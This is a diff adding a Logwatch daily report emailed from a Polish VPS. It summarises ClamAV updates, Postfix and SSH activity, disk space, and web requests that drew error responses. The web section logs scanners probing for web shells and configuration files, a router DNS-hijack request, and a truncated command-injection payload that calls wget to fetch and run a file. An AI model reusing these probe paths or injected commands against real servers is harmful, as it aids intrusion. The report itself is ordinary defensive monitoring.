@@ -1,0 +1,233 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id 5CFB99F202E1; Thu, 20 Sep 2018 03:51:14 +0200 (CEST)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20180920015114.5CFB99F202E1@hrankiety.pl>
+Date: Thu, 20 Sep 2018 03:51:10 +0200 (CEST)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Thu Sep 20 03:51:10 2018
+        Date Range Processed: yesterday
+                              ( 2018-Sep-19 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Wed Sep 19 03:11:17 2018
+ 
+ Last Status:
+    main.cvd is up to date (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)
+    Downloading daily-24950.cdiff [100%]
+    Downloading daily-24951.cdiff [100%]
+    Downloading daily-24952.cdiff [100%]
+    Downloading daily-24953.cdiff [100%]
+    Downloading daily-24954.cdiff [100%]
+    daily.cld updated (version: 24954, sigs: 2091912, f-level: 63, builder: neo)
+    bytecode.cld is up to date (version: 327, sigs: 91, f-level: 63, builder: neo)
+    [LibClamAV] Detected duplicate databases /var/lib/clamav/main.cvd and /var/lib/clamav/main.cld, please manually remove one of them
+    Database updated (6658252 signatures) from db.local.clamav.net (IP: 104.16.188.138)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 2 Time(s)
+       /images/logintxt.png?id=1': 1 Time(s)
+       /login.cgi?cli=aa%20aa%27;wget%20http://80 ... h%20/tmp/kh%27$: 2 Time(s)
+    404 Not Found
+       //wp-login.php: 1 Time(s)
+       /12.php: 1 Time(s)
+       /1213.php: 1 Time(s)
+       /3.php: 1 Time(s)
+       /56.php: 1 Time(s)
+       /9510.php: 1 Time(s)
+       /9678.php: 1 Time(s)
+       /_query.php: 1 Time(s)
+       /ak47.php: 1 Time(s)
+       /ak48.php: 1 Time(s)
+       /angge.php: 1 Time(s)
+       /aotu.php: 1 Time(s)
+       /aw.php: 1 Time(s)
+       /bak.php: 1 Time(s)
+       /blog//wp-login.php: 1 Time(s)
+       /cainiao.php: 1 Time(s)
+       /ceshi.php: 1 Time(s)
+       /cmd.php: 3 Time(s)
+       /cmdd.php: 1 Time(s)
+       /cmx.php: 1 Time(s)
+       /conflg.php: 1 Time(s)
+       /data.php: 1 Time(s)
+       /data/admin/ver.txt: 1 Time(s)
+       /data/admin/verifies.txt: 1 Time(s)
+       /db.init.php: 1 Time(s)
+       /db_cts.php: 1 Time(s)
+       /db_dataml.php: 1 Time(s)
+       /db_desql.php: 1 Time(s)
+       /db_pma.php: 1 Time(s)
+       /db_session.init.php: 1 Time(s)
+       /default.php: 1 Time(s)
+       /defect.php: 1 Time(s)
+       /dnscfg.cgi?dnsPrimary=198.27.121.241&dnsS ... =0&dnsRefresh=1: 1 Time(s)
+       /fack.php: 1 Time(s)
+       /feixiang.php: 1 Time(s)
+       /h1.php: 1 Time(s)
+       /hell.php: 1 Time(s)
+       /help-e.php: 1 Time(s)
+       /help.php: 2 Time(s)
+       /hh.php: 1 Time(s)
+       /hm.php: 1 Time(s)
+       /images/login.jpg: 1 Time(s)
+       /infoo.php: 1 Time(s)
+       /ip.php: 1 Time(s)
+       /java.php: 1 Time(s)
+       /js/adap.js: 1 Time(s)
+       /knal.php: 1 Time(s)
+       /l7.php: 1 Time(s)
+       /l8.php: 1 Time(s)
+       /lala-dpr.php: 1 Time(s)
+       /lala.php: 1 Time(s)
+       /license.php: 1 Time(s)
+       /lindex.php: 1 Time(s)
+       /log.php: 2 Time(s)
+       /logon.php: 1 Time(s)
+       /m.php?pbid=open: 1 Time(s)
+       /min.php: 1 Time(s)
+       /muhstik-dpr.php: 1 Time(s)
+       /muhstik.php: 1 Time(s)
+       /muhstik2.php: 1 Time(s)
+       /mx.php: 1 Time(s)
+       /mz.php: 1 Time(s)
+       /pe.php: 1 Time(s)
+       /phpStudy.php: 1 Time(s)
+       /phpinfi.php: 1 Time(s)
+       /phpmyadmin: 1 Time(s)
+       /phpstudy.php: 1 Time(s)
+       /pmd_online.php: 1 Time(s)
+       /post.php: 1 Time(s)
+       /python.php: 1 Time(s)
+       /q.php: 2 Time(s)
+       /qaq.php: 2 Time(s)
+       /qq.php: 4 Time(s)
+       /qwe.php: 1 Time(s)
+       /s.php: 1 Time(s)
+       /sean.php: 1 Time(s)
+       /sheep.php: 1 Time(s)
+       /shell.php: 2 Time(s)
+       /ssaa.php: 1 Time(s)
+       /system.php: 1 Time(s)
+       /test.php: 2 Time(s)
+       /text.php: 1 Time(s)
+       /uploader.php: 1 Time(s)
+       /w.php: 1 Time(s)
+       /wan.php: 1 Time(s)
+       /wanan.php: 1 Time(s)
+       /wc.php: 1 Time(s)
+       /webdav/: 1 Time(s)
+       /webslee.php: 1 Time(s)
+       /weixiao.php: 1 Time(s)
+       /wordpress//wp-login.php: 1 Time(s)
+       /wp-admins.php: 1 Time(s)
+       /wp-config.php: 1 Time(s)
+       /wp//wp-login.php: 1 Time(s)
+       /wpo.php: 1 Time(s)
+       /wuwu11.php: 1 Time(s)
+       /x.php: 1 Time(s)
+       /xiao.php: 1 Time(s)
+       /xiaoma.php: 1 Time(s)
+       /xiaomae.php: 1 Time(s)
+       /xiaomar.php: 1 Time(s)
+       /xshell.php: 1 Time(s)
+       /xw.php: 1 Time(s)
+       /xw1.php: 1 Time(s)
+       /xx.php: 2 Time(s)
+       /xz.php: 1 Time(s)
+       /yumo.php: 1 Time(s)
+       /z.php: 1 Time(s)
+       /zshmindex.php: 1 Time(s)
+       /zuo.php: 1 Time(s)
+       /zuoindex.php: 1 Time(s)
+       /zuoshou.php: 1 Time(s)
+    405 Method Not Allowed
+       /: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+       40   *Warning: Pre-queue content-filter connection overload 
+      226   SASL authentication failed 
+       54   Miscellaneous warnings 
+ 
+    2.161M  Bytes accepted                         2,266,175
+    2.155M  Bytes delivered                        2,259,969
+ ========   ================================================
+ 
+       29   Accepted                                  90.62%
+        3   Rejected                                   9.38%
+ --------   ------------------------------------------------
+       32   Total                                    100.00%
+ ========   ================================================
+ 
+        3   Reject HELO/EHLO                         100.00%
+ --------   ------------------------------------------------
+        3   Total Rejects                            100.00%
+ ========   ================================================
+ 
+      288   Connections made      
+      288   Disconnections        
+       29   Removed from queue    
+       27   Delivered             
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Timeout (inbound)     
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+       89.77.72.8 (89-77-72-8.dynamic.chello.pl): 1 time
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   25G   26G  49% /
+ none            512M  4.0K  512M   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
